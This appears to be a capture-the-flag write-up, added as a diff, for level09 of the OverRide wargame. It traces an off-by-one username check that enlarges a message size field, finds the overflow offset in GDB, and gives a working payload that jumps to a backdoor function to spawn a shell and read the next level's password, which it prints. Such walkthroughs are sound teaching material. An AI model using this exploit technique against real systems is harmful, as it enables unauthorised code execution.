@@ -1,0 +1,85 @@
+level09@OverRide:~$ ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: test
+>: Welcome, test
+>: Msg @Unix-Dude
+>>: test
+>: Msg sent!
+
+# Tested with very long input 
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude   # Only 41 char are printed, and i can't manage to make it segfault
+
+# let's look at the code
+# handle_msg function
+
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c                 # 140 char of data
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0  # Those line create a 40 bytes space for our username
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c  # Set the max size of msg
+   
+# We can see a struct like object being created:
+
+typedef struct msg
+{
+  char    data[140];
+  char    username[40];
+  size_t  size;
+} msg_t;
+
+# set_username function
+
+# Everything looks well protected, but we find a flaw
+
+   0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1
+   0x0000555555554a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28
+ 
+# The program check for the username length 1 by 1 with a conditional jump if length > 40 ! 
+# But we saw that in the struct the username space was 40 bytes long not 41 ! So we have 1 byte to exploit! The byte will replace the next element in the strcut
+# So we can print 'A' * 40 + '\xff' (\xff = 255 biggest 1 bytes number), by making this, the  "size_t  size" will be 255 instead of 140 !!
+
+# Let's see where it is used now
+# set_msg funct
+
+   0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt> # Here it is, size is used in strncpy,
+# So now that we made it longer than the allocated space of the message we can look for an offset
+
+gdb-peda$ r <<<$(python2 -c "print'a' * 40 + '\xff' + '\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'")
+
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+RBP+0 found at offset: 201
+
+# We found offset = 201 ! We remove 1 to overwrite the last instruction so the offset is 200 ! we'll need 200 of padding
+
+Now that we have the offset and a way to go where we want we need a target ! 
+Lucky for us there is a function 0x55555555488c <secret_backdoor> in the code, that calls system with one argument we provide!
+So we just have to redirect the eip on this function, and give it "/bin/sh" in argument and we should be good ! 
+SO here is our payload :
+[40* padding] + [size = '\xff'] + ['\n' to go in next input] + [200* offset padding] + [secret_backdoor address in little endian] + [arg '/bin/sh']
+
+level09@OverRide:~$ (python -c "print 'a'*40 + '\xff' + '\n' + '\x90'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat -) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
